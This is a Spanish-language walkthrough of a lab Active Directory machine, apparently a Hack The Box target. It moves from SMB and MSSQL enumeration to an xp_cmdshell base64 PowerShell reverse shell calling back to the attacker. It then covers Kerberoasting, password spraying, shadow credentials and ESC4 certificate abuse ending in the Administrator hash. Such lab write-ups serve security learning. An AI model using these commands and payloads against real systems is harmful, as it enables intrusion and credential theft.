#AD #MSSQL #ShadowCredentials #ESC4 

Antes de empezar la maquina se nos suministran unas credenciales
```ad-info
 rose::KxEPkKe6R8su
```
# Enumeración

Empezamos a enumerar todos los puertos disponibles y abiertos usando [[NMAP]]
```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.232.128 -oG allPorts
```

```shell
 [*] IP Address: 10.129.232.128
 [*] Open ports: 53,88,135,139,389,445,464,636,1433,3268,5985,9389,47001,49664,49665,49666,49667,49693,49694,49695,49710,49726,49735,49810
```

Con los puertos abiertos con [[NMAP]] hacemos un escaneo mas exhaustivo
```shell
nmap -p53,88,135,139,389,445,464,636,1433,3268,5985,9389,47001,49664,49665,49666,49667,49693,49694,49695,49710,49726,49735,49810 -sCV 10.129.232.128 -oN targeted
```


## Enumeración del SMB

Con [[CRACKMAPEXEC]] enumeraremos el dominio para sacar el nombre de este y poder añadrilo al `/etc/hosts`
```shell
nxc smb 10.129.232.128
```

Añadimos al `/etc/hosts` la IP y el dominio `10.129.232.128  sequel.htb dc01 dc01.sequel.htb`

### Verificamos si el usuario es valido
Con el usuario que nos han proporcionado validamos si este es valido usando [[CRACKMAPEXEC]]
```shell
nxc smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su'
```

Verificamos que si que son validas las credenciales

### Enumeración de usuarios existentes
Con las credenciales validas enumeramos usuarios existentes obteniendo así una lista de usuarios
```shell
nxc smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su' --rid-brute  | grep "SidTypeUser" | awk '{print $6}' | cut -d '\' -f2-2 | tee users.txt
```

### Enumeración de usuarios validos
Con [[KERBRUTE]] enumeramos cual de los usuarios que hemos obtenido anteriormente son realmente validos
```shell
kerbrute userenum --dc 10.129.232.128 -d sequel.htb users.txt
```

### Enumeramos los recursos compartidos en red
Con [[CRACKMAPEXEC]] enumeramos los recursos compartidos a los que el usuario `rose` tiene acceso
```shell
nxc smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su' --shares
```

Vemos que hay un recurso compartido llamado `Accounting Department`
```shell
Share                          Permissions     Remark
-----                          -----------     ------
Accounting Department          READ            
ADMIN$                                         Remote Admin
C$                                             Default share
IPC$                           READ            Remote IPC
NETLOGON                       READ            Logon server share 
SYSVOL                         READ            Logon server share 
Users                          READ            
```

Accedemos a `Accounting Department` usando [[SMBCLIENT]] con el usuario valido
```shell
smbclient //10.129.232.128/"Accounting Department" -U 'rose%KxEPkKe6R8su'
```

Encontramos dos archivos excel, y nos los traemos a nuestra maquina
```shell
get accounting_2024.xlsx
```
```shell
get accounts.xlsx
```

Vemos que tipo de archivo es usando `file`
```shell
file accounts.xlsx
```

Observamos que es un archivo comprimido así que lo descomprimimos para ver el contenido
```shell
7z x accounts.xlsx
```

Y en el directorio `xl/sharedStrings.xml` al ver el archivo con un `cat` podremos ver el contenido del excel, de ahi obtenemos una lista de usuarios y contraseñas, verificamos cuales son validas

Usando [[CRACKMAPEXEC]] y nuestra lista de usuariso cre
```shell
nxc smb 10.129.232.128 -u users.txt -p passwords.txt
```

Descubrimos el usuario
```ad-hint
oscar::86LxLBMgEWaKUnBG
```

Verificamos que el usuario es valido
```shell
nxc smb 10.129.232.128 -u 'oscar' -p '86LxLBMgEWaKUnBG'
```

Verificamos los recursos compartidos a los que tiene acceso
```shell
nxc smb 10.129.232.128 -u 'oscar' -p '86LxLBMgEWaKUnBG'
```

## Enumeración MSSQL

Probamos si el usuario `rose` tiene eacceso
```shell
impacket-mssqlclient 'sequel.htb/rose:KxEPkKe6R8su@10.129.232.128'
```

Y también probamos con `sa`
```shell
impacket-mssqlclient 'sequel.htb/sa:MSSQLP@ssw0rd!@10.129.232.128'
```

Obteniendo así un acceso a las bases de datos

### Enumeración e las bases de datos
Enumeramos las bases de datos que hay
```shell
select name from sys.databases;
```

Mostrándonos 
```shell
name     
------   
master   
tempdb   
model    
msdb     
```

Son las bases de datos por defecto, vamos a intentar ejecutar comandos de cmd
Primero nos habilitamos la ejecucucion de comandos
```shell
enable_xp_cmdshell
```

Segundo ejecutamos un comando
```shell
xp_cmdshell whoami;
```

Vemos que somos el usuario `sql_svc`
Vamos a explotar esta opción cargando una shell en base64 [[#MSSQL Shell Injection]]




# Explotación
## AS-REP Roasting Attack

```shell
impacket-GetNPUsers -no-pass -usersfile users.txt sequel.htb/
```

## Password spraying

```shell
nxc smb 10.129.232.128 -u users.txt -p 'KxEPkKe6R8su' 
```


## User as Password

```shell
nxc smb 10.129.232.128 -u users.txt -p users.txt --no-bruteforce
```


## Kerberoasting

Enumerar usuarios kerberoasteables
```shell
impacket-GetUserSPNs 'sequel.htb/rose:KxEPkKe6R8su'
```

Encontramos dos usuarios
```shell

ServicePrincipalName     Name     MemberOf                                            
-----------------------  -------  ----------------------------------------------------
sequel.htb/sql_svc.DC01  sql_svc  CN=SQLRUserGroupSQLEXPRESS,CN=Users,DC=sequel,DC=htb
sequel.htb/ca_svc.DC01   ca_svc   CN=Cert Publishers,CN=Users,DC=sequel,DC=htb        
```

Solicitar los tickets de estsos usuarios
```shell
impacket-GetUserSPNs 'sequel.htb/rose:KxEPkKe6R8su' -request
```

Nos lo guardamos en un fichero llamado `hash`
Los crakeamos
```shell
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

```shell
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
```

No son crackeables ya que no obtenemos ninguna password obtenida


## MSSQL Shell Injection
Cargaremos con el usuario oscar una shell en base64 obtenida de `revshells` usando la `PowerShel #3 (Base64)` y la cargamos en el mssql
```shell
xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

Y nos ponemos en escucha por el puerto `443` con pnelope y obtemeos una shell como usuario `sql_svc`

### Shell sql_svc
Enumeramos los privilegios de nuestro usuario
```shell
whoami /priv
```

Vemos que tenemos habilitados los permisos
```shell
SeChangeNotifyPrivilege      
SeCreateGlobalPrivilege      
```


Enumeramos nuestros directorios con 
```shell
tree /f /a
```


Enumeramos el directorio de `Users`
```shell
tree /f /a
```

Enumeramos también `(:`, en el cual encontramso un directorio inusual llamdo `SQL2019` con una carpeta dentro llena de ficheros, uno de ellos sule contener contraseñas como es el caso de `sql-Configuration.INI` vemos el contenido de este con
```shell
type sql-Configuration.INI
```

Encontramos una contraseña `WqSZAF6CysDQbGb3` la guardamos en nuestro fichero de contraseñas
Y volvemos a usar el diccionario de usuarios y la contraseña encontrada para ver a quien le pertenece
```shell
nxc smb 10.129.232.128 -u users.txt -p 'WqSZAF6CysDQbGb3'
```

Encontramos que las credenciales pertenecen a `ryan`
```ad-hint
ryan::WqSZAF6CysDQbGb3
```

### Shell ryan

Vamos a validar si el usuario pertenece a `Remote Management` 
```shell
nxc winrm 10.129.232.128 -u 'ryan' -p 'WqSZAF6CysDQbGb3'
```

Vemos que pertenece asi que nos conectamos
```shell
evil-winrm -i 10.128.232.128 -u ryan -p WqSZAF6CysDQbGb3
```

## BloodHound

Desde fuera en nuestra maquina atacante nos hacemos una recoleccion de informacion para pasarla a [[BLOODHOUND]]
```shell
bloodhound-python -d sequel.htb -ns 10.129.232.128 -u 'ryan' -p 'WqSZAF6CysDQbGb3' -c ALL --zip
```

Se lo pasamos a [[BLOODHOUND]]
![[Pasted image 20260211200805.png]]

Buscamos a un usuario que tenemos `pwned`
![[Pasted image 20260211201034.png]]

En `Outbound Object control`
![[Pasted image 20260211202116.png]]

### Shadow Credentials

Nos hacemos owned de `ca_svc` con el usuario `ryan`
```shell
impacket-owneredit -action write -new-owner 'ryan' -target-dn 'CN=CERTIFICATION AUTHORITY,CN=USERS,DC=SEQUEL,DC=HTB' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.129.232.128
```

Y después darle control total a `ryan`
```shell
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target-dn 'CN=CERTIFICATION AUTHORITY,CN=USERS,DC=SEQUEL,DC=HTB' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.129.232.128
```

Añadimos las shadow credentials a `ca_svc`
```shell
pywhisker -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --target ca_svc --action add
```

Obtenemos el hash con la informacion obtenida
```shell
certipy auth -pfx zX5kmYs5.pfx -password u35mJEVwQSjQTFnmBNSl -username ca_svc -domain sequel.htb -dc-ip 10.129.232.128
```

```c++
[*] Got hash for 'ca_svc@sequel.htb': aad3b435b51404eeaad3b435b51404ee:3b181b914e7a9d5508ea1e20bc2b7fce
```


Vemos si tiene alguna vulnerabilidad
```shell
certipy find -u 'ca_svc@sequel.htb' -hashes aad3b435b51404eeaad3b435b51404ee:3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.232.128 -vulnerable -stdout
```

```C++
[!] Vulnerabilities ESC4: User has dangerous permissions.
```

### Abusing ESC4

Usamos la versión de Certipy 5.0.4
```shell
certipy template -dc-ip 10.129.232.128 -u ca_svc -hashes aad3b435b51404eeaad3b435b51404ee:3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -target sequel.htb -write-default-configuration
```

Obtennos el certificado del usuario `Administrador` y nos lo traemos a nuestra maquina
```shell
certipy req -u 'ca_svc@sequel.htb' -hashes aad3b435b51404eeaad3b435b51404ee:3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb
```

Nos autenticamos con este certificado para obtener el hash
```shell
certipy auth -pfx administrator_3c00b508-04c8-48be-9ba2-cc00b7af5fb0.pfx -dc-ip 10.129.232.128
```

```c++
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

Nos conectamos al usuario `Administrador` con el hash obtenido
```shell
evil-winrm -i 10.129.232.128 -u administrator -H '7a8d4e04986afa8ed4060f75e5a0b3ff'
```

